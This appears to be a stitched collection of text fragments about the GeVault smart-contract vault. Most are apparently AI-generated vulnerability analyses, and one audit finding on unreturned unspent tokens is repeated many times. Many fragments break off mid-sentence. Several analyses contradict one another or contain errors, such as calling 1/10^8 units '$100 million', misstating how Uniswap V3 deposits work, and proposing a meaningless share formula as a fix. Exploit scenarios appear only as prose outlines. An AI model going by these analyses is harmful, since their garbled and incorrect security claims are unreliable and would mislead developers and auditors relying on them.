While it does contain some potential issues with rounding and precision errors that could potentially lead to unexpected results, it is not exploitable in the way that the vulnerability description suggests.\n\nThe main issue with this code is that it relies on a single-sided transfer of liquidity, which means that if an attacker were to deposit only a small amount of liquidity and then transfer a large amount of tokens to the pool afterward, they could potentially manipulate the rounding of their minted shares. However, this attack requires an attacker to have control over two different assets in the pool, which is unlikely given that the Uniswap V3 protocol only allows for liquidity providers to deposit one asset at a time. Additionally, the `claimFee()` function ensures that any fees collected from previous trades are claimed before the new deposit is made, reducing the potential impact of this attack.\n\nAnother potential issue with this code is that it contains some floating-point operations, which can lead to rounding errors and precision issues. However, these issues are likely not exploitable in the way that the vulnerability description suggests, as they would only affect the calculation of the returned liquidity amount and the minted shares for the attacker's deposit.\n\nTherefore, while this code does contain some potential issues, it is not exploitable in the way that the vulnerability description suggests, and there is no indication that it contains any critical vulnerabilities.",

This can cause the attacker to obtain more shares than they should, effectively allowing them to steal funds from other liquidity providers.\n* Rounding down attacks: If the code rounds the minted shares to zero due to a small initial liquidity provided, it can result in the attacker obtaining no share of the pool's assets, even if they have contributed liquidity to the pool.\n\nThe vulnerability lies in the improper handling of the smallest possible amount deposited and attributions during the calculation of new liquidity provider shares. By exploiting this vulnerability, attackers can cause asset loss or compromise the pool's integrity.\n\nTo fix this vulnerability, the code should be modified to handle the smallest possible amount deposited and attributions more carefully.

The contract uses the token's share price (ratio between total shares minted and total reserve) to calculate rewards accumulated or converts shares to token amount, which can be manipulated by a malicious user with added token liquidity and cross-chain bridging techniques. This can cause the token's share price to become too high, leading to an overflow when the contract tries to convert shares to token amount, resulting in failure of withdrawal transactions due to overflow and preventing users from accessing their funds.\n2. The contract does not lock a minimum amount of total reserve, which can allow the share price to be easily manipulated, ensuring a stable share price for the underlying token and preventing overflows and fund freezing issues.\n3. The contract's `deposit` function calculates proportion of deposit that goes to pending fee pool by using the `fee0+fee1 > 0` condition, which can cause the fee pool to be manipulated if fees are both zero or missing on one side. This can lead to overflow issues when calculating fees and prevent users from accessing their funds.\n4. The contract's `deposit` function also uses the `LiquidityAmounts.getAmountsForLiquidity` function to calculate the amount of liquidity added, but it does not check if the returned liquidity is less than or equal to the expected liquidity.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

Instead, they are stored values that only change when the owner calls specific functions to set or stop ramping the target price.\n\nThe vulnerability is caused by the use of `sqrt( (2 ** 192 * ((TOKEN0_PRICE * 10 ** TOKEN1.decimals) / TOKEN1_PRICE)) / ( 10 ** TOKEN0.decimals ) )` in the calculation of the `amt0` and `amt1` variables.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

The vulnerability lies in the `deposit` function of the smart contract. Specifically, it is the calculation of the new liquidity provider shares that is affected by this vulnerability.\n2. The `claimFee` function is called before the deposit, which transfers a large amount of attributions to the pool after depositing a small amount. This can cause the newly minted shares of the liquidity provider to round down to zero due to the small initial liquidity provided by the first liquidity provider.\n3. The `deposit` function calculates the new liquidity provider shares using the following formula: `lpAmt = totalSupply() * newLiquidity / (liquidity + feeLiquidity)`. This formula is vulnerable to manipulation because the denominator `(liquidity + feeLiquidity)` can be very small due to the large amount of attributions transferred by the first liquidity provider.\n4. If the new liquidity provider deposits a small amount, their share of the pool may round down to zero, effectively allowing the attacker to steal funds from other liquidity providers.\n\nTherefore, the given smart contract code is vulnerable to the \"Small Liquidity Provision Manipulation\" vulnerability type due to the calculation of new liquidity provider shares in the `deposit` function being affected by the large amount of attributions transferred by the first liquidity provider.",

The `nonReentrant` modifier is applied to the function, but it is not clear whether this modifier would be sufficient to prevent multiple depositors from simultaneously interacting with the contract and causing reentrancy issues. It may be necessary to add additional checks or locks in the code to ensure that only one depositor can interact with the contract at a time.\n\nAnother potential issue is that the code does not validate the input parameters for the `deposit` function, such as the amount of liquidity provided by each depositor and the minimum amount of liquidity that must be added to the pool. It may be necessary to add additional checks in the code to ensure that these input parameters are validated properly and do not cause issues with the contract's functionality.\n\nOverall, while this smart contract code does contain some potential issues, it is not vulnerable to the described attack based on the given vulnerability knowledge.

However, during this process, the fees associated with the deposited liquidity are not deducted from the user's available funds, leading to an incorrect calculation of the total available funds in the liquidity pool.\n\nHere is an example exploit scenario:\n\n1. Alice deposits 100 tokens into a liquidity pool and immediately withdraws them by repaying a borrowed position.\n2. Bob notices that Alice's withdrawal was successful but did not deduct the fees associated with her deposited liquidity, leading to an incorrect calculation of the total available funds in the liquidity pool.\n3. Bob then deposits 100 tokens into the same liquidity pool and immediately withdraws them by repaying a borrowed position.\n4. The smart contract calculates Bob's withdrawal amount based on the updated value of the liquidity pool, which includes Alice's deposit and withdrawal, but does not take into account the fees associated with Alice's deposited liquidity.\n5. As a result, Bob's withdrawal is successful, but he has actually received less tokens than he expected.\n\nTo mitigate this vulnerability, the smart contract code should deduct the hedging fees from the used funds in the affected trade functions, ensuring accurate calculation of available funds and appropriate token value.",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

The reason for this is that the \"deposit\" function calculates the amount of shares and associated fees inaccurately by using an amount-to-share calculation, whereas the \"mint\" function uses a share-to-amount calculation. This can lead to errors in the calculations and allow users to exploit the system.\n\nTo evaluate whether this vulnerability exists in the given smart contract code, we need to analyze the \"rebalance\" function.

However, we can analyze the code step by step and identify potential issues that could lead to vulnerabilities.\n\n1. Functionality: The `deployAssets()` function in the smart contract appears to be designed to automatically deploy assets into a liquidity pool when a new tick occurs. It retrieves the current active tick index, calculates the amount of available token0 and token1 balances, and then deposits them into the respective ticks based on their position in the liquidity pool's order book.\n2. Potential Vulnerability: Based on the vulnerability knowledge provided, it is possible that the function could be vulnerable to a lack of post-validation enforcement of the reserve ratio. The function deposits assets into the ticks based on their position in the liquidity pool's order book, but does not ensure that the total amount of assets held by the pool meets the required reserve ratio after each deposit.\n3. Reason for Vulnerability: The vulnerability arises from the fact that the function only checks whether the available token balances are greater than zero before depositing them into the ticks. However, this does not ensure that the total amount of assets held by the pool meets the reserve ratio requirement after each deposit.\n4. Mitigation: To mitigate this vulnerability, the function could be modified to perform additional validation checks after each deposit to ensure that the total amount of assets held by the pool meets the required reserve ratio. This could involve calculating the total amount of assets held in the ticks and comparing it to the reserve ratio requirement before executing each deposit.\n5. Conclusion: Based on the analysis, it is possible that the given smart contract code is vulnerable to a lack of post-validation enforcement of the reserve ratio. The function only checks whether the available token balances are greater than zero before depositing them into the ticks, but does not ensure that the total amount of assets held by the pool meets the required reserve ratio after each deposit.

Unchecked deposit of assets into a liquidity pool: The `deployAssets()` function in the smart contract code does not perform any checks to ensure that the tokens being deposited are part of the correct ticks or are within the reserve ratio limit. This could allow an attacker to deposit more assets than what is allowed by the reserve ratio, potentially causing the pool to become overfunded and leading to a loss of user funds.\n2. Insufficient validation of token amounts: The `deployAssets()` function does not check if the amount of tokens being deposited is within the correct range or if there are any fees associated with the deposit.

Validate token amounts by checking if they are within the correct range and accounting for any fees associated with the deposit.\n3.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

The reason for this vulnerability is that the `depositAndStash` function allows external calls to the `deposit` function of the `TokenisableRange` contract, which can be controlled by an attacker.\n\nHere's a summary of the functionality of the given code:\n\n1. The `depositAndStash` function takes two token amounts and a `TokenisableRange` object as inputs.\n2. It checks that the sender has approved the transfer of the first token amount from their account to the `TokenisableRange` contract, using the `checkSetApprove` function.\n3. It then checks that the sender has approved the transfer of the second token amount from their account to the `TokenisableRange` contract, using the `checkSetApprove` function.\n4. The `depositAndStash` function then calls the `deposit` function of the `TokenisableRange` object with the first and second token amounts as inputs, which deposits the tokens into the range.\n5. The `depositAndStash` function then retrieves the balance of the `TokenisableRange` contract in the `bal` variable.\n6. If the `bal` value is greater than zero, it calls the `checkSetApprove` function to approve the transfer of the `bal` amount from the `TokenisableRange` contract to the `lendingPool` contract.\n7.

The `depositAndStash` function then returns the total liquidity in the range, which includes the amount deposited by the `deposit` function of the `TokenisableRange` object and the amount transferred to the `lendingPool` contract.\n\nThe vulnerability arises from the fact that the `depositAndStash` function allows external calls to the `de",

Implement reentrancy guards: One way to prevent reentrancy attacks is to use reentrancy guards, which are mechanisms that ensure a function cannot be called more than once before its previous execution has completed. In the given code, this could be achieved by adding a `bool` variable that tracks whether the `depositAndStash` function has been entered and setting it to `true` at the beginning of the function. If the variable is already set to `true`, the function can return immediately without calling any other functions.\n2. Update state before making external calls: Another way to mitigate reentrancy attacks is to update a contract's state before making external calls. In the given code, this could be achieved by updating the `bal` variable to reflect the current balance of the contract before making the call to the `deposit` function on the `TokenisableRange` contract. This will ensure that any subsequent reentrant calls will have access to the updated state and prevent exploitation of the vulnerability.\n3. Use patterns like Checks-Effects-Interactions: The Checks-Effects-Interactions (CEI) pattern is a structuring technique for smart contract functions that ensures all conditions and state changes are processed before any interactions with external contracts are made. In the given code, this could be achieved by moving the `checkSetApprove` function calls to the beginning of the `depositAndStash` function, before the call to the `deposit` function on the `TokenisableRange` contract.

This can result in a situation where an attacker can obtain higher shares of the pool than they should, effectively allowing them to steal funds from other liquidity providers.\n\nThe reason for this vulnerability is that the `liquidity` calculation uses the formula `liquidity = tSupply * valueX8 / vaultValueX8`, where `tSupply` is the total supply of the pool, `valueX8` is the value of the deposit in units of 1/10^8 (i.e., $100 million), and `vaultValueX8` is the current total value of the pool in units of 1/10^8. However, this formula has a rounding error when the initial liquidity provided is extremely small, as it rounds down to zero if the result of the division `tSupply * valueX8 / vaultValueX8` is less than one.\n\nTo exploit this vulnerability, an attacker can deposit a very small amount of liquidity (e.g., 10^3 tokens) and then transfer a large amount of their deposited tokens to the pool after depositing. This will result in a rounding down error in the `liquidity` calculation and an attacker can obtain higher shares of the pool than they should, effectively allowing them to steal funds from other liquidity providers.\n\nTo fix this vulnerability, it is recommended to modify the `liquidity` calculation to use a more accurate formula that does not have a rounding error, such as `liquidity = tSupply * (valueX8 + vaultValueX8) / 2`.

